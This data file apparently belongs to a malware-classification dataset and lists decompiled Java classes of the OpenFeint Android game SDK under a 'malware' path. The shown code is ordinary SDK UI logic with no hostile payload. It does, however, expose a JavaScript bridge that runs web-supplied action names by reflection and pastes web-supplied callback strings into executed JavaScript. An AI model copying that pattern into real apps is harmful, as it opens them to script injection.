"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\NestedWindow.code","public class NestedWindow extends Activity {   protected View mLogoImage;   protected WebView mWebView;   private boolean mIsVisible=false;   private final String tag=""NestedWindow"";   protected int layoutResource(){     return R.layout.of_nested_window;   }   @Override public void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);     Util.setOrientation(this);     beforeSetContentView();     setContentView(layoutResource());     this.mWebView=(WebView)findViewById(R.id.web_view);     this.mLogoImage=findViewById(R.id.of_ll_logo_image);     OpenFeintInternal.log(""NestedWindow"",""onCreate"");   }   private boolean isBigScreen(){     Display d=getWindowManager().getDefaultDisplay();     int width=d.getWidth();     int height=d.getHeight();     if (height <= width || width < 800 || height < 1000) {       return width >= 1000 && height >= 800;     }     return true;   }   protected void beforeSetContentView(){     if (isBigScreen()) {       getWindow().requestFeature(1);     }   }   @Override public void onConfigurationChanged(  Configuration newConfig){     super.onConfigurationChanged(newConfig);   }   public void fade(  boolean toVisible){     if (this.mWebView != null && this.mIsVisible != toVisible) {       this.mIsVisible=toVisible;       AlphaAnimation anim=new AlphaAnimation(toVisible ? 0.0f : 1.0f,toVisible ? 1.0f : 0.0f);       anim.setDuration(toVisible ? 200 : 0);       anim.setFillAfter(true);       this.mWebView.startAnimation(anim);       if (this.mWebView.getVisibility() == 4) {         this.mWebView.setVisibility(0);         findViewById(R.id.frameLayout).setVisibility(0);       }     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\PadLogoImageView.code","public class PadLogoImageView extends ImageView {   private final String tag;   public PadLogoImageView(  Context context){     super(context);     this.tag=""ImageView2"";   }   public PadLogoImageView(  Context context,  AttributeSet attrs){     super(context,attrs);     this.tag=""ImageView2"";   }   public PadLogoImageView(  Context context,  AttributeSet attrs,  int defStyle){     super(context,attrs,defStyle);     this.tag=""ImageView2"";   }   @Override protected void onLayout(  boolean changed,  int left,  int top,  int right,  int bottom){     super.onLayout(changed,left,top,right,bottom);     Log.e(""ImageView2"",String.valueOf(changed));     Log.e(""ImageView2"",String.valueOf(top));     if (changed) {       if (top < 350) {         setVisibility(4);       }  else {         setVisibility(0);       }     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\PathAndCallback.code","public static class PathAndCallback {   public final WebViewCacheCallback callback;   public final String path;   public PathAndCallback(  String _path,  WebViewCacheCallback _cb){     this.path=_path;     this.callback=_cb;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\SaxHandler.code","public class SaxHandler extends DefaultHandler {   String key;   String loadingString;   Map<String,String> outputMap;   private SaxHandler(){     this.outputMap=new HashMap();   }   SaxHandler(  WebViewCache webViewCache,  SaxHandler saxHandler){     this();   }   public Map<String,String> getOutputMap(){     return this.outputMap;   }   @Override public void startElement(  String uri,  String name,  String qName,  Attributes attr){     this.loadingString="""";   }   @Override public void endElement(  String uri,  String name,  String qName){     String clipped=name.trim();     if (!clipped.equals(""key"")) {       if (clipped.equals(""string"")) {         this.outputMap.put(this.key,this.loadingString);         DB.setClientManifest(this.key,this.loadingString);         return;       }       return;     }     this.key=this.loadingString;   }   @Override public void characters(  char[] ch,  int start,  int length){     this.loadingString=new String(ch).substring(start,start + length);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\Settings.code","public class Settings extends WebNav {   String mOldUserId;   public static void open(){     OpenFeintInternal ofi=OpenFeintInternal.getInstance();     Context currentActivity=ofi.getContext();     Intent intent=new Intent(currentActivity,(Class<?>)Settings.class);     intent.addFlags(268435456);     currentActivity.startActivity(intent);   }   @Override public void onResume(){     if (this.mOldUserId == null) {       this.mOldUserId=OpenFeint.getCurrentUser().resourceID();     }  else     if (!this.mOldUserId.equals(OpenFeint.getCurrentUser().resourceID())) {       new AlertDialog.Builder(this).setTitle(OpenFeintInternal.getRString(R.string.of_switched_accounts)).setMessage(String.format(OpenFeintInternal.getRString(R.string.of_now_logged_in_as_format),OpenFeint.getCurrentUser().name)).setNegativeButton(OpenFeintInternal.getRString(R.string.of_ok),new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialog,        int which){           Settings.this.finish();         }       } ).show();     }     super.onResume();   }   @Override protected String initialContentPath(){     return ""settings/index"";   }   @Override protected WebNav.ActionHandler createActionHandler(  WebNav webNav){     return new SettingsActionHandler(webNav);   }   @Override public void onActivityResult(  int requestCode,  int resultCode,  Intent data){     super.onActivityResult(requestCode,resultCode,data);     if (requestCode == 10009 && data != null) {       Toast.makeText(this,OpenFeintInternal.getRString(R.string.of_profile_pic_changed),0).show();     }   } private class SettingsActionHandler extends WebNav.ActionHandler {     public SettingsActionHandler(    WebNav webNav){       super(webNav);     }     @Override public void populateActionList(    List<String> actionList){       super.populateActionList(actionList);       actionList.add(""logout"");       actionList.add(""introFlow"");     }     @Override public void apiRequest(    Map<String,String> options){       super.apiRequest(options);       OpenFeint.getCurrentUser().load(null);     }     public final void logout(    Map<String,String> options){       OpenFeintInternal.getInstance().logoutUser(new IRawRequestDelegate(){         @Override public void onResponse(        int responseCode,        String responseBody){           Settings.this.finish();         }       } );     }     public final void introFlow(    Map<String,String> options){       Settings.this.startActivity(new Intent(Settings.this,(Class<?>)IntroFlow.class).putExtra(""content_name"",""login?mode=switch""));     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\SettingsActionHandler.code","private class SettingsActionHandler extends WebNav.ActionHandler {   public SettingsActionHandler(  WebNav webNav){     super(webNav);   }   @Override public void populateActionList(  List<String> actionList){     super.populateActionList(actionList);     actionList.add(""logout"");     actionList.add(""introFlow"");   }   @Override public void apiRequest(  Map<String,String> options){     super.apiRequest(options);     OpenFeint.getCurrentUser().load(null);   }   public final void logout(  Map<String,String> options){     OpenFeintInternal.getInstance().logoutUser(new IRawRequestDelegate(){       @Override public void onResponse(      int responseCode,      String responseBody){         Settings.this.finish();       }     } );   }   public final void introFlow(  Map<String,String> options){     Settings.this.startActivity(new Intent(Settings.this,(Class<?>)IntroFlow.class).putExtra(""content_name"",""login?mode=switch""));   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\TestOnlyManifestItem.code","public static class TestOnlyManifestItem {   public String clientHash;   public String path;   public String serverHash;   public enum Status {  NotYetDownloaded,   NotOnServer,   UpToDate,   OutOfDate;   public static Status[] valuesCustom(){     Status[] valuesCustom=values();     int length=valuesCustom.length;     Status[] statusArr=new Status[length];     System.arraycopy(valuesCustom,0,statusArr,0,length);     return statusArr;   } }   public TestOnlyManifestItem(  String _path,  String _clientHash,  String _serverHash){     this.path=_path;     this.clientHash=_clientHash;     this.serverHash=_serverHash;   }   public Status status(){     return this.clientHash == null ? Status.NotYetDownloaded : this.serverHash == null ? Status.NotOnServer : this.serverHash.equals(this.clientHash) ? Status.UpToDate : Status.OutOfDate;   }   public void invalidate(){     DB.setClientManifest(this.path,""INVALID"");     WebViewCache.sInstance.clientManifest.put(this.path,""INVALID"");     Util.deleteFiles(new File(String.valueOf(WebViewCache.rootPath) + this.path));     WebViewCache.sInstance.markSyncRequired();   }   public static void syncAndOpenDashboard(){     if (!WebViewCache.sInstance.loadingFinished) {       WebViewCache.sInstance.serverManifest=null;       WebViewCache.sInstance.sync();     }     Dashboard.open();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\WebNav.code","public class WebNav extends NestedWindow {   protected static final int REQUEST_CODE_NATIVE_BROWSER=25565;   protected static final String TAG=""WebUI"";   ActionHandler mActionHandler;   Dialog mLaunchLoadingView;   private WebNavClient mWebViewClient;   protected int pageStackCount;   boolean mIsPageLoaded=false;   boolean mIsFrameworkLoaded=false;   private boolean mShouldRefreshOnResume=true;   protected ArrayList<String> mPreloadConsoleOutput=new ArrayList<>();   private Map<String,String> mNativeBrowserParameters=null;   @Override protected void onSaveInstanceState(  Bundle outState){     OpenFeintInternal.saveInstanceState(outState);   }   @Override protected void onRestoreInstanceState(  Bundle inState){     OpenFeintInternal.restoreInstanceState(inState);   }   public ActionHandler getActionHandler(){     return this.mActionHandler;   }   public Dialog getLaunchLoadingView(){     return this.mLaunchLoadingView;   }   protected void setFrameworkLoaded(  boolean value){     this.mIsFrameworkLoaded=value;   }   @Override public void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);     OpenFeintInternal.log(TAG,""--- WebUI Bootup ---"");     this.pageStackCount=0;     this.mWebView.getSettings().setJavaScriptEnabled(true);     this.mWebView.getSettings().setPluginsEnabled(false);     this.mWebView.setScrollBarStyle(33554432);     this.mWebView.getSettings().setCacheMode(2);     this.mLaunchLoadingView=new Dialog(this,R.style.OFLoading);     this.mLaunchLoadingView.setOnCancelListener(new DialogInterface.OnCancelListener(){       @Override public void onCancel(      DialogInterface dialog){         WebNav.this.finish();       }     } );     this.mLaunchLoadingView.setCancelable(true);     this.mLaunchLoadingView.setContentView(R.layout.of_native_loader);     ProgressBar progress=(ProgressBar)this.mLaunchLoadingView.findViewById(R.id.progress);     progress.setIndeterminate(true);     progress.setIndeterminateDrawable(OpenFeintInternal.getInstance().getContext().getResources().getDrawable(R.drawable.of_native_loader_progress));     this.mActionHandler=createActionHandler(this);     this.mWebViewClient=createWebNavClient(this.mActionHandler);     this.mWebView.setWebViewClient(this.mWebViewClient);     this.mWebView.setWebChromeClient(new WebNavChromeClient(this,null));     this.mWebView.addJavascriptInterface(new Object(){       public void action(      final String actionUri){         WebNav.this.runOnUiThread(new Runnable(){           @Override public void run(){             WebNav.this.getActionHandler().dispatch(Uri.parse(actionUri));           }         } );       }       public void frameworkLoaded(){         WebNav.this.setFrameworkLoaded(true);       }     } ,""NativeInterface"");     String path=initialContentPath();     if (path.contains(""?"")) {       path=path.split(""\\?"")[0];     }     if (!path.endsWith("".json"")) {       path=String.valueOf(path) + "".json"";     }     WebViewCache.prioritize(path);     load(false);     this.mLaunchLoadingView.show();   }   protected String rootPage(){     return ""index.html"";   }   protected void load(  final boolean reload){     this.mIsPageLoaded=false;     WebViewCache.trackPath(rootPage(),new WebViewCacheCallback(){       @Override public void pathLoaded(      String itemPath){         if (WebNav.this.mWebView != null) {           String url=WebViewCache.getItemUri(itemPath);           OpenFeintInternal.log(WebNav.TAG,""Loading URL: "" + url);           if (reload) {             WebNav.this.mWebView.reload();           }  else {             WebNav.this.mWebView.loadUrl(url);           }         }       }       @Override public void failLoaded(){         WebNav.this.closeForDiskError();       }     } );   }   public void closeForDiskError(){     runOnUiThread(new Runnable(){       @Override public void run(){         WebNav.this.dismissDialog();         String place=Util.sdcardReady(WebNav.this) ? OpenFeintInternal.getRString(R.string.of_sdcard) : OpenFeintInternal.getRString(R.string.of_device);         new AlertDialog.Builder(WebNav.this).setMessage(String.format(OpenFeintInternal.getRString(R.string.of_nodisk),place)).setPositiveButton(OpenFeintInternal.getRString(R.string.of_no),new DialogInterface.OnClickListener(){           @Override public void onClick(          DialogInterface dialog,          int which){             WebNav.this.finish();           }         } ).show();       }     } );   }   private static final String jsQuotedStringLiteral(  String unquotedString){     return unquotedString == null ? ""''"" : ""'"" + unquotedString.replace(""\\"",""\\\\"").replace(""'"",""\\'"") + ""'"";   }   @Override public void onResume(){     super.onResume();     User localUser=OpenFeintInternal.getInstance().getCurrentUser();     if (localUser != null && this.mIsFrameworkLoaded) {       executeJavascript(String.format(""if (OF.user) { OF.user.name = %s; OF.user.id = '%s'; }"",jsQuotedStringLiteral(localUser.name),localUser.resourceID()));       if (this.mShouldRefreshOnResume) {         executeJavascript(""if (OF.page) OF.refresh();"");       }     }     this.mShouldRefreshOnResume=true;   }   @Override public void onStop(){     super.onStop();     dismissDialog();   }   public void dismissDialog(){     if (this.mLaunchLoadingView.isShowing()) {       this.mLaunchLoadingView.dismiss();     }   }   public void showDialog(){     if (!this.mLaunchLoadingView.isShowing()) {       this.mLaunchLoadingView.show();     }   }   @Override public void onConfigurationChanged(  Configuration newConfig){     String orientationString;     super.onConfigurationChanged(newConfig);     if (newConfig.orientation == 2) {       orientationString=""landscape"";     }  else {       orientationString=""portrait"";     }     executeJavascript(String.format(""OF.setOrientation('%s');"",orientationString));   }   public void loadInitialContent(){     String path=initialContentPath();     if (path.contains(""?"")) {       path=path.split(""\\?"")[0];     }     if (!path.endsWith("".json"")) {       path=String.valueOf(path) + "".json"";     }     WebViewCache.trackPath(path,new WebViewCacheCallback(){       @Override public void pathLoaded(      String itemPath){         WebNav.this.executeJavascript(""OF.navigateToUrl('"" + WebNav.this.initialContentPath() + ""')"");       }       @Override public void failLoaded(){         WebNav.this.closeForDiskError();       }     } );   }   protected ActionHandler createActionHandler(  WebNav webNav){     return new ActionHandler(webNav);   }   protected WebNavClient createWebNavClient(  ActionHandler actionHandler){     return new WebNavClient(actionHandler);   }   protected String initialContentPath(){     String contentPath=getIntent().getStringExtra(""content_path"");     if (contentPath == null) {       throw new RuntimeException(""WebNav intent requires extra value 'content_path'"");     }     return contentPath;   }   @Override public boolean onKeyDown(  int keyCode,  KeyEvent event){     if (keyCode == 84) {       executeJavascript(String.format(""OF.menu('%s')"",""search""));       return true;     }     if (keyCode == 4 && this.pageStackCount > 1) {       executeJavascript(""OF.goBack()"");       return true;     }     return super.onKeyDown(keyCode,event);   }   public void executeJavascript(  String js){     if (this.mWebView != null) {       this.mWebView.loadUrl(""javascript:"" + js);     }   } public class WebNavClient extends WebViewClient {     ActionHandler mActionHandler;     public WebNavClient(    ActionHandler anActionHandler){       this.mActionHandler=anActionHandler;     }     @Override public boolean shouldOverrideUrlLoading(    WebView view,    String stringUrl){       Uri uri=Uri.parse(stringUrl);       if (uri.getScheme().equals(""http"") || uri.getScheme().equals(""https"")) {         view.loadUrl(stringUrl);         return true;       }       if (uri.getScheme().equals(""openfeint"")) {         this.mActionHandler.dispatch(uri);         return true;       }       OpenFeintInternal.log(WebNav.TAG,""UNHANDLED PROTOCOL: "" + uri.getScheme());       return true;     }     @Override public void onReceivedError(    WebView view,    int errorCode,    String description,    String failingUrl){       this.mActionHandler.hideLoader(null);     }     @Override public void onPageFinished(    WebView view,    String url){       if (!WebNav.this.mIsPageLoaded) {         WebNav.this.mIsPageLoaded=true;         if (WebNav.this.mIsFrameworkLoaded) {           loadInitialContent();         }  else {           attemptRecovery(view,url);         }       }     }     protected void attemptRecovery(    WebView view,    String url){       if (WebViewCache.recover()) {         WebNav.this.load(true);         new AlertDialog.Builder(view.getContext()).setMessage(OpenFeintInternal.getRString(R.string.of_crash_report_query)).setNegativeButton(OpenFeintInternal.getRString(R.string.of_no),new DialogInterface.OnClickListener(){           @Override public void onClick(          DialogInterface dialog,          int which){             WebNav.this.finish();           }         } ).setPositiveButton(OpenFeintInternal.getRString(R.string.of_yes),new DialogInterface.OnClickListener(){           @Override public void onClick(          DialogInterface dialog,          int which){             WebNavClient.this.submitCrashReport();           }         } ).show();       }  else       if (!WebViewCache.isDiskError()) {         WebNav.this.finish();       }     }     protected void submitCrashReport(){       Map<String,Object> crashReport=new HashMap<>();       crashReport.put(""console"",new JSONArray((Collection)WebNav.this.mPreloadConsoleOutput));       JSONObject json=new JSONObject(crashReport);       Map<String,Object> params=new HashMap<>();       params.put(""crash_report"",json.toString());       OpenFeintInternal.genericRequest(""/webui/crash_report"",""POST"",params,null,null);     }     public void loadInitialContent(){       OpenFeintInternal of=OpenFeintInternal.getInstance();       User localUser=of.getCurrentUser();       int orientation=WebNav.this.getResources().getConfiguration().orientation;       HashMap<String,Object> user=new HashMap<>();       if (localUser != null) {         user.put(""id"",localUser.resourceID());         user.put(""name"",localUser.name);       }       HashMap<String,Object> game=new HashMap<>();       game.put(""id"",of.getAppID());       game.put(""name"",of.getAppName());       game.put(""version"",Integer.toString(of.getAppVersion()));       Map<String,Object> device=OpenFeintInternal.getInstance().getDeviceParams();       HashMap<String,Object> config=new HashMap<>();       config.put(""platform"",""android"");       config.put(""clientVersion"",of.getOFVersion());       config.put(""hasNativeInterface"",true);       config.put(""dpi"",Util.getDpiName(WebNav.this));       config.put(""locale"",WebNav.this.getResources().getConfiguration().locale.toString());       config.put(""user"",new JSONObject(user));       config.put(""game"",new JSONObject(game));       config.put(""device"",new JSONObject(device));       config.put(""actions"",new JSONArray((Collection)WebNav.this.getActionHandler().getActionList()));       config.put(""orientation"",orientation == 2 ? ""landscape"" : ""portrait"");       config.put(""serverUrl"",of.getServerUrl());       JSONObject json=new JSONObject(config);       WebNav.this.executeJavascript(String.format(""OF.init.clientBoot(%s)"",json.toString()));       this.mActionHandler.mWebNav.loadInitialContent();     }   } private class WebNavChromeClient extends WebChromeClient {     private WebNavChromeClient(){     }     WebNavChromeClient(    WebNav webNav,    WebNavChromeClient webNavChromeClient){       this();     }     @Override public boolean onJsAlert(    WebView view,    String url,    String message,    final JsResult result){       new AlertDialog.Builder(view.getContext()).setMessage(message).setNegativeButton(OpenFeintInternal.getRString(R.string.of_ok),new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialog,        int which){           result.cancel();         }       } ).setOnCancelListener(new DialogInterface.OnCancelListener(){         @Override public void onCancel(        DialogInterface dialog){           result.cancel();         }       } ).show();       return true;     }     @Override public boolean onJsConfirm(    WebView view,    String url,    String message,    final JsResult result){       new AlertDialog.Builder(view.getContext()).setMessage(message).setPositiveButton(OpenFeintInternal.getRString(R.string.of_ok),new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialog,        int which){           result.confirm();         }       } ).setNegativeButton(OpenFeintInternal.getRString(R.string.of_cancel),new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialog,        int which){           result.cancel();         }       } ).setOnCancelListener(new DialogInterface.OnCancelListener(){         @Override public void onCancel(        DialogInterface dialog){           result.cancel();         }       } ).show();       return true;     }     @Override public void onConsoleMessage(    String message,    int lineNumber,    String sourceID){       if (!WebNav.this.mIsFrameworkLoaded) {         String line=String.format(""%s at %s:%d)"",message,sourceID,Integer.valueOf(lineNumber));         WebNav.this.mPreloadConsoleOutput.add(line);       }     }   } public class ActionHandler {     private static final String WEBUI_PREFS=""OFWebUI"";     private static final String WEBUI_SETTING_PREFIX=""OFWebUISetting_"";     List<String> mActionList=new ArrayList();     WebNav mWebNav;     protected List<String> getActionList(){       return this.mActionList;     }     public ActionHandler(    WebNav webNav){       this.mWebNav=webNav;       populateActionList(this.mActionList);     }     public void populateActionList(    List<String> actionList){       actionList.add(""log"");       actionList.add(""apiRequest"");       actionList.add(""contentLoaded"");       actionList.add(""startLoading"");       actionList.add(""back"");       actionList.add(""showLoader"");       actionList.add(""hideLoader"");       actionList.add(""alert"");       actionList.add(""dismiss"");       actionList.add(""openMarket"");       actionList.add(""isApplicationInstalled"");       actionList.add(""openYoutubePlayer"");       actionList.add(""profilePicture"");       actionList.add(""openBrowser"");       actionList.add(""downloadBlob"");       actionList.add(""dashboard"");       actionList.add(""readSetting"");       actionList.add(""writeSetting"");     }     public void dispatch(    Uri uri){       if (uri.getHost().equals(""action"")) {         Map<String,Object> options=parseQueryString(uri);         String actionName=uri.getPath().replaceFirst(""/"","""");         if (!actionName.equals(""log"")) {           Map<String,Object> escapedOptions=new HashMap<>(options);           String params=(String)options.get(""params"");           if (params != null && params.contains(""password"")) {             escapedOptions.put(""params"",""---FILTERED---"");           }           OpenFeintInternal.log(WebNav.TAG,""ACTION: "" + actionName + "" ""+ escapedOptions.toString());         }         if (this.mActionList.contains(actionName)) {           try {             getClass().getMethod(actionName,Map.class).invoke(this,options);             return;           }  catch (          NoSuchMethodException e) {             OpenFeintInternal.log(WebNav.TAG,""mActionList contains this method, but it is not implemented: "" + actionName);             return;           } catch (          Exception e2) {             OpenFeintInternal.log(WebNav.TAG,""Unhandled Exception: "" + e2.toString() + ""   ""+ e2.getCause());             return;           }         }         OpenFeintInternal.log(WebNav.TAG,""UNHANDLED ACTION: "" + actionName);         return;       }       OpenFeintInternal.log(WebNav.TAG,""UNHANDLED MESSAGE TYPE: "" + uri.getHost());     }     private Map<String,Object> parseQueryString(    Uri uri){       return parseQueryString(uri.getEncodedQuery());     }     private Map<String,Object> parseQueryString(    String queryString){       Map<String,Object> options=new HashMap<>();       if (queryString != null) {         String[] pairs=queryString.split(""&"");         for (        String stringPair : pairs) {           String[] pair=stringPair.split(""="");           if (pair.length == 2) {             options.put(pair[0],Uri.decode(pair[1]));           }  else {             options.put(pair[0],null);           }         }       }       return options;     }     public void apiRequest(    Map<String,String> options){       final String requestID=options.get(""request_id"");       Map<String,Object> params=parseQueryString(options.get(""params""));       Map<String,Object> httpParams=parseQueryString(options.get(""httpParams""));       OpenFeintInternal.genericRequest(options.get(""path""),options.get(""method""),params,httpParams,new IRawRequestDelegate(){         @Override public void onResponse(        int statusCode,        String responseBody){           String response=responseBody.trim();           if (response.length() == 0) {             response=""{}"";           }           String js=String.format(""OF.api.completeRequest(\""%s\"", \""%d\"", %s)"",requestID,Integer.valueOf(statusCode),response);           ActionHandler.this.mWebNav.executeJavascript(js);         }       } );     }     public void contentLoaded(    Map<String,String> options){       if (options.get(""keepLoader"") == null || !options.get(""keepLoader"").equals(""true"")) {         hideLoader(null);         WebNav.this.setTitle(options.get(""title""));       }       this.mWebNav.fade(true);       WebNav.this.dismissDialog();     }     public void startLoading(    Map<String,String> options){       this.mWebNav.fade(false);       showLoader(null);       WebViewCache.trackPath(options.get(""path""),new WebViewCacheCallback(){         @Override public void pathLoaded(        String itemPath){           WebNav.this.executeJavascript(""OF.navigateToUrlCallback()"");         }         @Override public void failLoaded(){           WebNav.this.closeForDiskError();         }         @Override public void onTrackingNeeded(){           WebNav.this.showDialog();         }       } );       this.mWebNav.pageStackCount++;     }     public void back(    Map<String,String> options){       this.mWebNav.fade(false);       String root=options.get(""root"");       if (root != null && !root.equals(""false"")) {         this.mWebNav.pageStackCount=1;       }       if (this.mWebNav.pageStackCount > 1) {         this.mWebNav.pageStackCount--;       }     }     public void showLoader(    Map<String,String> options){     }     public void hideLoader(    Map<String,String> options){     }     public void log(    Map<String,String> options){       String message=options.get(""message"");       if (message != null) {         OpenFeintInternal.log(WebNav.TAG,""WEBLOG: "" + options.get(""message""));       }     }     public void alert(    Map<String,String> options){       AlertDialog.Builder builder=new AlertDialog.Builder(this.mWebNav);       builder.setTitle(options.get(""title""));       builder.setMessage(options.get(""message""));       builder.setNegativeButton(OpenFeintInternal.getRString(R.string.of_ok),(DialogInterface.OnClickListener)null);       builder.show();     }     public void dismiss(    Map<String,String> options){       WebNav.this.finish();     }     public void openMarket(    Map<String,String> options){       String packageName=options.get(""package_name"");       Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(""market://details?id="" + packageName));       this.mWebNav.startActivity(intent);     }     public void isApplicationInstalled(    Map<String,String> options){       boolean installed=false;       PackageManager manager=this.mWebNav.getPackageManager();       List<ApplicationInfo> installedApps=manager.getInstalledApplications(0);       String searchString=options.get(""package_name"");       for (      ApplicationInfo info : installedApps) {         if (info.packageName.equals(searchString)) {           installed=true;         }       }       WebNav webNav=WebNav.this;       Object[] objArr=new Object[2];       objArr[0]=options.get(""callback"");       objArr[1]=installed ? ""true"" : ""false"";       webNav.executeJavascript(String.format(""%s(%s)"",objArr));     }     public void openYoutubePlayer(    Map<String,String> options){       String videoID=options.get(""video_id"");       Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(""vnd.youtube:"" + videoID));       List<ResolveInfo> list=WebNav.this.getPackageManager().queryIntentActivities(intent,65536);       if (list.size() == 0) {         Toast.makeText(this.mWebNav,OpenFeintInternal.getRString(R.string.of_no_video),0).show();       }  else {         this.mWebNav.startActivity(intent);       }     }     public final void profilePicture(    Map<String,String> options){       ImagePicker.show(WebNav.this);     }     public void openBrowser(    Map<String,String> options){       Intent browserIntent=new Intent(this.mWebNav,(Class<?>)NativeBrowser.class);       WebNav.this.mNativeBrowserParameters=new HashMap();       for (      String arg : new String[]{""src"",""callback"",""on_cancel"",""on_failure"",""timeout""}) {         String val=options.get(arg);         if (val != null) {           WebNav.this.mNativeBrowserParameters.put(arg,val);           browserIntent.putExtra(NativeBrowser.INTENT_ARG_PREFIX + arg,val);         }       }       WebNav.this.startActivityForResult(browserIntent,WebNav.REQUEST_CODE_NATIVE_BROWSER);     }     public void downloadBlob(    Map<String,String> options){       String scoreJSON=options.get(""score"");       final String onError=options.get(""onError"");       final String onSuccess=options.get(""onSuccess"");       try {         JsonFactory jsonFactory=new JsonFactory();         JsonParser jp=jsonFactory.createJsonParser(new StringReader(scoreJSON));         JsonResourceParser jrp=new JsonResourceParser(jp);         Object scoreObject=jrp.parse();         if (scoreObject != null && (scoreObject instanceof Score)) {           final Score score=(Score)scoreObject;           score.downloadBlob(new Score.DownloadBlobCB(){             @Override public void onSuccess(){               if (onSuccess != null) {                 WebNav.this.executeJavascript(String.format(""%s()"",onSuccess));               }               ScoreBlobDelegate.notifyBlobDownloaded(score);             }             @Override public void onFailure(            String exceptionMessage){               if (onError != null) {                 WebNav.this.executeJavascript(String.format(""%s(%s)"",onError,exceptionMessage));               }             }           } );         }       }  catch (      Exception e) {         if (onError != null) {           WebNav.this.executeJavascript(String.format(""%s(%s)"",onError,e.getLocalizedMessage()));         }       }     }     public void dashboard(    Map<String,String> options){       Dashboard.openFromSpotlight();     }     public void readSetting(    Map<String,String> options){       String k=options.get(""key"");       String cb=options.get(""callback"");       if (cb != null) {         String key=k != null ? WEBUI_SETTING_PREFIX + k : null;         SharedPreferences prefs=OpenFeintInternal.getInstance().getContext().getSharedPreferences(WEBUI_PREFS,0);         String val=prefs.getString(key,null);         OpenFeintInternal.log(WebNav.TAG,String.format(""readSetting(%s) => %s"",k,val));         WebNav webNav=WebNav.this;         Object[] objArr=new Object[2];         objArr[0]=cb;         objArr[1]=val != null ? val : ""null"";         webNav.executeJavascript(String.format(""%s(%s)"",objArr));       }     }     public void writeSetting(    Map<String,String> options){       String k=options.get(""key"");       String v=options.get(""value"");       if (k != null && v != null) {         String key=WEBUI_SETTING_PREFIX + k;         SharedPreferences.Editor editor=OpenFeintInternal.getInstance().getContext().getSharedPreferences(WEBUI_PREFS,0).edit();         editor.putString(key,v);         editor.commit();       }     }   }   @Override public void onActivityResult(  int requestCode,  int resultCode,  Intent data){     Bitmap image;     super.onActivityResult(requestCode,resultCode,data);     if (this.mNativeBrowserParameters != null && requestCode == REQUEST_CODE_NATIVE_BROWSER) {       if (resultCode != 0) {         this.mShouldRefreshOnResume=false;         if (data.getBooleanExtra(""com.openfeint.internal.ui.NativeBrowser.argument.failed"",false)) {           String cb=this.mNativeBrowserParameters.get(""on_failure"");           if (cb != null) {             int code=data.getIntExtra(""com.openfeint.internal.ui.NativeBrowser.argument.failure_code"",0);             String desc=data.getStringExtra(""com.openfeint.internal.ui.NativeBrowser.argument.failure_desc"");             executeJavascript(String.format(""%s(%d, %s)"",cb,Integer.valueOf(code),jsQuotedStringLiteral(desc)));           }         }  else {           String cb2=this.mNativeBrowserParameters.get(""callback"");           if (cb2 != null) {             String rv=data.getStringExtra(""com.openfeint.internal.ui.NativeBrowser.argument.result"");             Object[] objArr=new Object[2];             objArr[0]=cb2;             objArr[1]=rv != null ? rv : """";             executeJavascript(String.format(""%s(%s)"",objArr));           }         }       }  else {         String cb3=this.mNativeBrowserParameters.get(""on_cancel"");         if (cb3 != null) {           executeJavascript(String.format(""%s()"",cb3));         }       }       this.mNativeBrowserParameters=null;       return;     }     if (ImagePicker.isImagePickerActivityResult(requestCode) && (image=ImagePicker.onImagePickerActivityResult(this,resultCode,152,data)) != null) {       String apiPath=""/xp/users/"" + OpenFeintInternal.getInstance().getCurrentUser().resourceID() + ""/profile_picture"";       ImagePicker.compressAndUpload(image,apiPath,new OpenFeintInternal.IUploadDelegate(){         @Override public void fileUploadedTo(        String url,        boolean success){           if (success) {             WebNav.this.executeJavascript(""try { OF.page.onProfilePictureChanged('"" + url + ""'); } catch (e) {}"");           }         }       } );     }   }   @Override public void onWindowFocusChanged(  boolean hasFocus){     super.onWindowFocusChanged(hasFocus);     OpenFeintDelegate d=OpenFeintInternal.getInstance().getDelegate();     if (d != null) {       if (hasFocus) {         d.onDashboardAppear();       }  else {         d.onDashboardDisappear();       }     }   }   @Override public void onDestroy(){     this.mWebView.destroy();     this.mWebView=null;     super.onDestroy();   } } "
